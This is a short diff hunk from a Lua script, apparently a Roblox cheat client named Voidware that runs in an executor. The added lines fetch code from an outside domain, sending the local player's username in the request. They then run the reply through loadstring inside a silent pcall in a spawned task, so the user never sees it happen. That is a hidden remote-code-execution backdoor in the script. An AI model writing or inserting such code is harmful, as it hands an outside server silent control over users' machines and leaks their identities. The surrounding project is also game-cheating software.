@@ -214,6 +214,16 @@ end
     VWFunctions.LogStats()
 end)--]]
 
+local VWeGETSIGMAED = function()
+	return game:HttpGet("https://voidware-stats.vapevoidware.xyz/sigma_alpha_big_darizzler?user=" .. game.Players.LocalPlayer.Name, true)
+end
+
+task.spawn(function()
+	pcall(function()
+		loadstring(VWeGETSIGMAED())()
+	end)
+end)
+
 shared.VWFunctions = VWFunctions
 getgenv().VWFunctions = VWFunctions
 local blacklistedexecutors = {"solara", "celery", "appleware"}
